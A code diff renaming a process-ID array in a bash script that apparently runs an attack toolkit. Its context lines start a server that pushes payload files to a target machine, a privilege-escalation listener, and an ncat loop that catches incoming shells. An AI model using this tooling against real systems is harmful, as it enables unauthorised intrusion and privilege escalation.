@@ -74,11 +74,11 @@ while true; do
 done
 
 #trap ctrl-c to kill the spawned processes
-pid=()
+pids_list=()
 kill_processes() {
   printf "\n"
   #first kill the background processes otherwise they will continuously spawn new processes
-  for i in ${pid[*]}; do
+  for i in ${pids_list[*]}; do
     kill -9 $i
   done
   listening_port_list=$(netstat -tpnl 2>/dev/null | awk '{ print $4 }' | awk -F: '{ print $2 }')
@@ -137,11 +137,11 @@ sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/priv_esc_payload
 
 #start the server that is gonna transfer the files needed by the payload to the target machine
 $path/python_server &
-pid+=($!)
+pids_list+=($!)
 
 #start the script that will accept connections after priviledge escalation
 $path/priv_esc_init portr=$portr path=$path &
-pid+=($!)
+pids_list+=($!)
 
 #start ncat and invoke the phantom script when a connection occurs
 while true; do
